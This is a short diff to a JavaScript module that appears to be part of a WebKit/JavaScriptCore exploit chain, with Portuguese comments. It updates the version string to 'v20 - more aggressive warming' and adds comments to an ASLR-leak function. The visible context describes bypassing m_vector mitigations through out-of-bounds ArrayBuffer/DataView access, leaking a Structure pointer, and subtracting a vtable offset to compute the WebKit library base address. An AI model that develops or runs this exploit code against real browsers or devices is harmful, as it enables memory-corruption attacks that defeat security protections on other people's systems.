@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v19 - Fortificando Alocacao OOB - Aquecimento de Buffer)
+// js/script3/testArrayBufferVictimCrash.mjs (v20 - Fortificando Alocacao OOB - Aquecimento Mais Agressivo)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
@@ -22,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v19 - Fortificando Alocacao OOB - Aquecimento de Buffer"; // Versão atualizada
+export const FNAME_MODULE = "v20 - Fortificando Alocacao OOB - Aquecimento Mais Agressivo"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -440,6 +440,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`[ASLR LEAK] SUCESSO na leitura do ponteiro da Structure após ajuste: ${structure_address_from_leak.toString(true)}`, "leak");
 
         // O resto da Fase 3 continua igual se a leitura da Structure for bem-sucedida
+        // DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE está sendo usado como offset da vtable do DataView
+        // para a base da biblioteca, o que é conceitualmente o que queremos para o cálculo da base.
         const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
         
         webkit_base_address = structure_address_from_leak.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);
